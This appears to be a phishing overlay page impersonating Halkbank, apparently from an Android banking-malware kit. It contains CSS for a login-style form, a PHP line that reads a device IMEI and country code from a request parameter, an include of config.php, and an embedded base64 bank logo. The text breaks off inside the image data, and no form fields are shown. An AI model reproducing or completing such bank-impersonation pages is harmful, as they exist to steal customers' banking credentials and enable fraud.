<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Halkbank</title>

    <style>
        body {
            margin: 0;
            padding: 20px;
            background: #fff;
        }

        label {
            float: left;
            color: gray;
            padding: 0 0 5px 5px;
        }

        #header {
            background: #fff;
			text-align: center;
        }

.input-field {
    width: 60%;
    height: 30px;
    border: 0;
    border-bottom: 1px solid #e3e3e3;
    border-radius: 6px;
    margin-bottom: 7px;
    padding: 0 0 0 5px;
}

        .submit-button {
            width: 60%;
            height: 36px;
            background: #1E75D0;
            color: #fff;
            border: 0;
            font-size: 1.2em;
        }

        .fielderror {
            border: 1px solid #f00;
            border-radius: 6px;
    width: 60%;
    height: 30px;
    border-radius: 6px;
    margin-bottom: 7px;
    padding: 0 0 0 5px;
        }
    </style>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>
<div id="content_div">
    <div id="header">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAA2CAYAAAB9R6Q8AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MTU2MTIxOTRDRDI0MTFFNUI2OEM4RTQxRkRENDU1NEUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MTU2MTIxOTVDRDI0MTFFNUI2OEM4RTQxRkRENDU1NEUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoxNTYxMjE5MkNEMjQxMUU1QjY4QzhFNDFGREQ0NTU0RSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoxNTYxMjE5M0NEMjQxMUU1QjY4QzhFNDFGREQ0NTU0RSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrItO5oAADgzSURBVHja7H0HmBzF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